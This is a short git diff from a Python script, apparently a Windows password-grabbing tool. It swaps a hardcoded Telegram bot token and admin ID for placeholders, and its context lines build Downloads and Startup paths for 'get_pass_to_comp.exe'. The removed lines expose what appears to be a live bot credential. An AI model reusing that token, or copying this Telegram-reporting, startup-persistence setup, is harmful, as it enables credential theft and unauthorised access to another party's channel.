@@ -12,8 +12,8 @@ import glob
 
 MY_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
 # telegram token and id
-TOKEN = '5026728362:AAGzmYf3Qt8vF9rOn4LNaEgPc3JXTtT5dJk'
-ADMIN_ID = '1820665678'
+TOKEN = 'some_token'
+ADMIN_ID = 'some_id'
 USER_NAME = gp.getuser()
 DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/get_pass_to_comp.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
